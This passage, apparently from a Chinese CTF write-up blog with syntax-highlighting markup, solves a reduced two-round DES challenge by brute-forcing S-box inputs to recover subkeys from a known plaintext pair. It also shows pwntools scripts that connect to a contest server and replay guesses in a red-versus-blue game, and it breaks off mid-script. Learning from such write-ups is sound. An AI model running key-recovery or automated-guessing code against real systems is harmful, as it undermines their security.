<span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">25</span>]</span><br><span class="line">Inv_P = [<span class="number">9</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">27</span>,</span><br><span class="line">         <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">Inv_IP = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>,</span><br><span class="line">          <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">          <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_table</span>(<span class="params">table</span>):</span></span><br><span class="line">    new = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> (x + <span class="number">1</span>) <span class="keyword">in</span> table:</span><br><span class="line">            num = table.index(x + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">            new.append(num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new.append(x)</span><br><span class="line">    <span class="keyword">return</span> new</span><br></pre></td></tr></table></figure>

<p>听V神讲了一遍还是不懂，但看到尚师傅做出来了，燃起来了，复现的斗志</p>
<p>缩起来惭愧，虽然赛后稍微研究下了feistel和DES，但还是被<code>key_64 += &#39;&#123;0:04b&#125;&#39;.format(int(key[i], 16))</code>这句话劝退了，因为看不懂<code>&#123;0:04b&#125;</code>，觉得好复杂；还是很不应该，实在不懂，你比赛时输出来看下啊</p>
<p>后面查了下是用4位的二进制表示，1位16进制的用4位二进制表示也够了</p>
<p>所以痛定思痛，既然不懂，我尝试复现整个des流程，红色表示已知和可以直接倒推的部分，绿色表示需要爆破的地方，这下就清晰了吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/des.svg" alt="des"></p>
<p><em>我放的是矢量图，有兴趣指导指导的师傅可以浏览器打开链接下载下来看看（最后我发现其实没有必要画的这么详细，知道一个func就差不多了；但毕竟之前不懂吧，绕远路才是我最短的捷径）</em></p>
<p>整道题的思路就是用一组随机的key去加密了已知的<code>testtest</code>得到结果<code>77a35598c47aeea6</code>，并用相同的key去加密我们的flag；那么解题的思路也很明了了，通过已知的明密文设法得到key，然后写解密函数，最终返回到</p>
<p>先搞key1（图中的key1我随便写的），只需要关注上面那个feistel结构</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210820190413902.png" alt="image-20210820190413902"></p>
<p>有些是可以直接逆回去的部分，形如<code>inv_permutation</code>和<code>per_func</code>这两个函数，就可以这样逆回来，写的有点臭屁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">text</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> Inv_IP:</span><br><span class="line">        final += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">null = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plain_text) == <span class="built_in">len</span>(Inv_IP)</span><br><span class="line">    final = null</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Inv_IP)):</span><br><span class="line">        final[Inv_IP[x]-<span class="number">1</span>] = plain_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(final)</span><br></pre></td></tr></table></figure>

<p>然后本题最为关键的就是爆破这个sbox；关于sbox的工作原理，简单来说就是将48位转成32位，中间是每6位转8位，就如wiki百科上以sbox5为例，<code>011011</code>首尾是<code>01</code>，中间是<code>1101</code>，也就是对应坐标<code>1,13</code>，对应到沙盒（这个是可以查表的）就是<code>1001</code>。这样一顿操作下来，就把原来总长48位的，拆分成8个小组，每组6位变成4位，从而最后的总长度为32。显然这个过程是不可逆的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210820204757956.png" alt="image-20210820204757956"></p>
<p>仔细观察沙盒发现一行中是<code>0~15</code>这16个数字打乱顺序，所以一个沙盒要爆破4种情况</p>
<p>写了下脚本，但感觉自己代码能力确实太差了啊，命名很成问题，最后有错误也检查不出来，后续再补</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> My_box <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">teststring = <span class="string">&quot;testtest&quot;</span></span><br><span class="line">cipher = <span class="number">0x77a35598c47aeea6</span></span><br><span class="line">final = <span class="built_in">bin</span>(cipher)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">c = <span class="string">&#x27;86721c7c1ebe2d0af8aa8e073073931b4a5ae6dcf03c784e3c70b5f8ce71cf9eb87f9b836eea0118&#x27;</span></span><br><span class="line"></span><br><span class="line">null64 = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">null32 = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plain_text) == <span class="built_in">len</span>(Inv_IP)</span><br><span class="line">    per_final = null64</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Inv_IP)):</span><br><span class="line">        per_final[Inv_IP[x]-<span class="number">1</span>] = plain_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(per_final)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">text</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> E:</span><br><span class="line">        temp += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_per_func</span>(<span class="params">s_final</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(s_final) == <span class="built_in">len</span>(P)</span><br><span class="line">    s_output = null32</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">        s_output[P[x] - <span class="number">1</span>] = s_final[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s_output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">text</span>):</span></span><br><span class="line">    exp = expand(text)</span><br><span class="line">    <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_column</span>(<span class="params">num, index, row</span>):</span></span><br><span class="line">    <span class="keyword">for</span> find_j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> S[index][row][find_j] == num:</span><br><span class="line">            <span class="keyword">return</span> find_j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    p = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> IP:</span><br><span class="line">        p += plain_text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    plain_textb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> en_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        plain_textb += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(plain_text[en_i], <span class="number">16</span>))</span><br><span class="line">    plain_textp = permutation(plain_textb)</span><br><span class="line">    en_left, en_right = plain_textp[:<span class="number">32</span>], plain_textp[<span class="number">32</span>:]</span><br><span class="line">    out = func(en_right)</span><br><span class="line">    <span class="keyword">return</span> en_left, en_right, out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbox</span>(<span class="params">s_input</span>):</span></span><br><span class="line">    s_out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> sbox_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s_row = <span class="built_in">int</span>(s_input[<span class="number">6</span> * sbox_i] + s_input[<span class="number">6</span> * sbox_i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_column = <span class="built_in">int</span>(s_input[<span class="number">6</span> * sbox_i + <span class="number">1</span>:<span class="number">6</span> * sbox_i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[sbox_i][s_row][s_column])</span><br><span class="line">    <span class="keyword">return</span> s_out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher_text) == <span class="built_in">len</span>(IP)</span><br><span class="line">    p = null64</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(IP)):</span><br><span class="line">        p[IP[x] - <span class="number">1</span>] = cipher_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher_text, d_sub_keys</span>):</span></span><br><span class="line">    d_final = <span class="built_in">bin</span>(<span class="built_in">int</span>(cipher_text, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    d_final = my_permutation(d_final)</span><br><span class="line">    d_left, d_right = d_final[:<span class="number">32</span>], d_final[<span class="number">32</span>:]</span><br><span class="line">    <span class="comment"># RIGHT</span></span><br><span class="line">    d_EXP = func(d_left)</span><br><span class="line">    <span class="comment"># inv_func</span></span><br><span class="line">    d_s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(d_EXP, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_sub_keys[<span class="number">1</span>], <span class="number">2</span>))</span><br><span class="line">    d_s_out = sbox(d_s_input)</span><br><span class="line">    out = per_func(d_s_out)</span><br><span class="line"></span><br><span class="line">    d_RIGHT = <span class="built_in">bin</span>(<span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_right, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LEFT</span></span><br><span class="line">    d_EXP = func(d_RIGHT)</span><br><span class="line">    d_s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(d_EXP, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_sub_keys[<span class="number">0</span>], <span class="number">2</span>))</span><br><span class="line">    d_s_out = sbox(d_s_input)</span><br><span class="line">    out = per_func(d_s_out)</span><br><span class="line"></span><br><span class="line">    d_LEFT = <span class="built_in">bin</span>(<span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_left, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    plaintext = d_LEFT + d_RIGHT</span><br><span class="line">    plaintext = inv_permutation(plaintext)</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">int</span>(plaintext[_:_+<span class="number">4</span>], <span class="number">2</span>))[<span class="number">2</span>:] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_rjust</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">for</span> rjust_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text)):</span><br><span class="line">        <span class="keyword">if</span> cipher_text[rjust_i] != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> cipher_text[rjust_i:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_pad</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">for</span> pad_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> cipher_text[pad_i] != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> cipher_text[:pad_i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydec</span>(<span class="params">ciphertext, d_sub_keys</span>):</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> de_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">16</span>):</span><br><span class="line">        block_enc = inv_rjust(ciphertext[de_i:de_i + <span class="number">16</span>])</span><br><span class="line">        block = decrypt(block_enc, d_sub_keys)</span><br><span class="line">        plaintext += block</span><br><span class="line">    plaintext = inv_pad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LEFT, RIGHT, EXP1 = encrypt(teststring.encode().<span class="built_in">hex</span>())</span><br><span class="line">final = my_permutation(final)</span><br><span class="line">left, right = final[:<span class="number">32</span>], final[<span class="number">32</span>:]</span><br><span class="line">EXP2 = func(left)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key1</span></span><br><span class="line">f_final1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(left, <span class="number">2</span>) ^ <span class="built_in">int</span>(LEFT, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment"># inv_func</span></span><br><span class="line">s_out1 = inv_per_func(f_final1)</span><br><span class="line"><span class="comment"># inv_sbox</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    bin_i = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    a1 = [<span class="built_in">int</span>(bin_i[_]+bin_i[_+<span class="number">1</span>], <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_i), <span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># j&#x27;s sbox</span></span><br><span class="line">    j1 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># i&#x27;s row</span></span><br><span class="line">    s_input1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> a1:</span><br><span class="line">        t1 = <span class="built_in">int</span>(s_out1[i1 * <span class="number">4</span>:i1 * <span class="number">4</span> + <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">        column1 = find_column(t1, j1, i1)</span><br><span class="line">        j1 += <span class="number">1</span></span><br><span class="line">        s_input1 += <span class="built_in">bin</span>(i1)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="number">0</span>] + <span class="built_in">bin</span>(column1)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="built_in">bin</span>(i1)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    key1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(s_input1, <span class="number">2</span>) ^ <span class="built_in">int</span>(EXP1, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># key2</span></span><br><span class="line">    f_final2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(right, <span class="number">2</span>) ^ <span class="built_in">int</span>(RIGHT, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    s_out2 = inv_per_func(f_final2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        bin_j = <span class="built_in">bin</span>(j)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        a2 = [<span class="built_in">int</span>(bin_j[_] + bin_j[_ + <span class="number">1</span>], <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_j), <span class="number">2</span>)]</span><br><span class="line">        j2 = <span class="number">0</span></span><br><span class="line">        s_input2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> a2:</span><br><span class="line">            t2 = <span class="built_in">int</span>(s_out2[j2 * <span class="number">4</span>:j2 * <span class="number">4</span> + <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            column2 = find_column(t2, j2, i2)</span><br><span class="line">            j2 += <span class="number">1</span></span><br><span class="line">            s_input2 += <span class="built_in">bin</span>(i2)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="number">0</span>] + <span class="built_in">bin</span>(column2)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="built_in">bin</span>(i2)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        key2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(s_input2, <span class="number">2</span>) ^ <span class="built_in">int</span>(EXP2, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        sub_keys = [key1, key2]</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(mydec(c, sub_keys), <span class="number">16</span>))</span><br><span class="line">        <span class="built_in">print</span>(i, i*j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Misc-red-vs-blue"><a href="#Misc-red-vs-blue" class="headerlink" title="Misc-red_vs_blue"></a>Misc-red_vs_blue</h3><p>经典红蓝对决，Misc的签到题，但是说实话，我有点麻</p>
<p>给了一个nc，连上玩一下就知道是两种情况让你猜，连续猜对66次得flag，每次连nc输赢的结果不同</p>
<p>这是当时我的脚本，我自以为没什么问题的吧，但是交互的情况让我几度咯血，各种IO错乱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest</span>():</span></span><br><span class="line">    <span class="comment"># not so fast</span></span><br><span class="line">    time.sleep(<span class="number">.05</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">r = <span class="string">b&#x27;r&#x27;</span></span><br><span class="line">b = <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28719</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># begin info</span></span><br><span class="line">sh.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># classical try red one</span></span><br><span class="line">    rest()</span><br><span class="line">    bug = sh.sendline(r)</span><br><span class="line">    feedback = sh.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Sorry&#x27;</span> <span class="keyword">in</span> feedback:</span><br><span class="line">        res.append(b)</span><br><span class="line">        sh.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(r)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        rest()</span><br><span class="line">        sh.sendline(i)</span><br><span class="line">        flag = sh.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure>

<p>然后问了pwn爷，怎样能达到好的交互效果；最后彭总给了一个脚本，学到了，写得好规整，吾辈楷模，贴下来日后遇到再学习</p>
<p><strong>主要就是一些格式上的转换，然后还有一句话一句话接收吧</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># connection</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28719</span>)</span><br><span class="line"><span class="comment"># receive intro text</span></span><br><span class="line">p.recvline()  <span class="comment"># Here are 66 AWD Games will begin!</span></span><br><span class="line">p.recvline()  <span class="comment"># The winner is between Red Team and Blue Team</span></span><br><span class="line">p.recvline()  <span class="comment"># To get the flag if you predict the results of all games successfully!</span></span><br><span class="line">p.recvline()  <span class="comment"># Game 1</span></span><br><span class="line">p.recvline()  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># record the results</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Your choice xxx Team</span></span><br><span class="line">    <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># The result xxx Team</span></span><br><span class="line">    <span class="comment"># win: The number of successful predictions xx</span></span><br><span class="line">    <span class="comment"># lose: Sorry!You are wrong!</span></span><br><span class="line">    result = p.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment"># print(result.find(&quot;successful&quot;))</span></span><br><span class="line">    <span class="keyword">if</span> result.find(<span class="string">&quot;successful&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;continue..&quot;)</span></span><br><span class="line">        s += <span 